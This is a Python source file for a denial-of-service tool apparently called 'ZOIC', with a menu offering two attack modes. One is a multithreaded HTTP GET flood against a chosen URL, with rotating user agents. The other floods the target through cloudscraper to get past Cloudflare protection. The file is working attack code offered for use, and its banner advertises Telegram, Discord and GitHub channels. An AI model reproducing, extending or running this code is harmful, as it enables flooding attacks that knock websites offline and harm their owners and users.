import threading
import datetime
import threading
import requests
import os
import random
import time
import cloudscraper

useragent = open("ua.txt").read().splitlines()

zoic = "\033[38;5;118m"
red = "\033[38;5;196m"
clear = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
          {zoic}
                     ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗            
                     ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝            
                     ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩   {clear}
                    github.com/cybermads
           {zoic}╔═══════════════════════════════════{clear}
           {zoic}║{clear}  {zoic}-{clear} http     {zoic}|{clear} HTTP Flood         
           {zoic}║{clear}  {zoic}-{clear} cfb      {zoic}|{clear} CloudFlare bypass
           {zoic}╚═══════════════════════════════════{clear}

""")              
    
def layer7():
    while True:
        banner()
        select = input(f"""
╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
╚══{zoic}>{clear} """)
         
        if select.startswith("http"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}http{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)
            
            end_time = time.time() + secs
            
            def http_attack(url, end_time):
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        requests.get(url, headers=headers, timeout=5)
                except:
                    pass
            
            def th(url, threads, end_time):
                for _ in range(threads):
                    t = threading.Thread(target=http_attack, args=(url, end_time))
                    t.start()
            
            th(url, threads, end_time)
            
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                    {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                    {clear}
      {zoic}╔══════════════════════════════════{clear}
      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}HTTP{zoic}]{clear} 
      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{secs}{zoic}]{clear}                     
      {zoic}╚══════════════════════════════════{clear}       
""")
            time.sleep(secs)

################################################################################################################################

        elif select.startswith("cfb"):
            parts = select.split()
            if len(parts) != 4:
                print(f"usage{zoic}:{clear} {zoic}cfb{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                input()
                continue

            _, url, threads, secs = parts
            threads = int(threads)
            secs = int(secs)
            
            end_time = time.time() + secs
            
            def cloudflare(url, end_time):
                scraper = cloudscraper.create_scraper()
                try:
                    while time.time() < end_time:
                        ua = random.choice(useragent)
                        headers = {"User-Agent": ua}
                        scraper.get(url, headers=headers, timeout=10)
                        scraper.head(url, headers=headers, timeout=10)
                except:
                    pass
            
            def th(url, threads, end_time):
                for _ in range(threads):
                    t = threading.Thread(target=cloudflare, args=(url, end_time))
                    t.start()
            
            th(url, threads, end_time)
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
                {zoic}                    
        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                {clear}
        {zoic}╔══════════════════════════════════{clear}
        {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}CloudFlare Bypass{zoic}]{clear} 
        {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
        {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
        {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{secs}{zoic}]{clear}                     
        {zoic}╚══════════════════════════════════{clear}       
            """)
            time.sleep(secs)




            

if __name__ == "__main__":
    layer7()












